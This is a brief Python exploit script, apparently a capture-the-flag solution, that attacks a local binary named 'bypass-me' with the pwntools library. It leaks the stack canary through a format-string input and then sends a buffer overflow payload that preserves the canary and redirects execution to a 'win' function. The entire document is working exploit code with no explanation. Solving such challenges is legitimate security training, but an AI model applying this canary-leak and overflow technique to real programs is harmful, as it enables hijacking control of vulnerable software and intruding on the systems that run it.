#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

exe = ELF("./bypass-me")

r = process([exe.path])
# gdb.attach(r)

win = exe.symbols["win"]

r.recvuntil(b"Leak? ")
r.sendline(b"%13$lu")
r.recvline()

val = r.recvline()
canary = int(val)

r.recvuntil(b"Enter your name: ")
payload = b"A"*24 + p64(canary) + b"A"*8 + p64(win)
r.sendline(payload)

r.interactive()
